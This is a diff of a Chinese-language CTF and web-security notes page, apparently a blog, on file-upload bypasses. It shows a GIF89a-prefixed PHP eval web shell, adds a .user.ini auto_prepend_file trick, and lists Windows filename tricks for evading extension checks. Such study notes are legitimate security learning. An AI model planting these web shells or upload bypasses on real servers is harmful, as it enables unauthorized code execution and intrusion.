@@ -455,6 +455,13 @@ var_dump(intval($f*100));
 <pre><code class="php">GIF89a
 &lt;script language=&#39;php&#39;&gt;@eval($_POST[&quot;a&quot;]);&lt;/script&gt;
 </code></pre>
+<h2 id="user-ini-上传漏洞"><a href="#user-ini-上传漏洞" class="headerlink" title=".user.ini 上传漏洞"></a>.user.ini 上传漏洞</h2><p><code>.htaccess</code> 只适用于<code>apache</code></p>
+<p>而<code>apache</code>&#x2F;<code>nginx</code>&#x2F;<code>iis</code>都会用到</p>
+<pre><code class="txt">
+GIF89a
+auto_prepend_file=tupianmaplus.png
+</code></pre>
+<p><code>auto_prepend_file</code>是在<code>php</code>文件代码执行前用<code>require</code>包含进指定的文件<br>所以有个特点是上传目录里必有<code>.php</code>文件</p>
 <h2 id="windows重命名特点"><a href="#windows重命名特点" class="headerlink" title="windows重命名特点"></a>windows重命名特点</h2><p><code>1.php.    .</code>会自动重命名为1.php</p>
 <p>在1.php后加::$DATA后文件会当作文件流处理，不会检测后缀</p>
 <h1 id="sql注入waf绕过"><a href="#sql注入waf绕过" class="headerlink" title="sql注入waf绕过"></a>sql注入waf绕过</h1><h1 id="zip-bomb"><a href="#zip-bomb" class="headerlink" title="zip bomb"></a>zip bomb</h1><p><a href="https://www.nssctf.cn/problem/400">题</a></p>
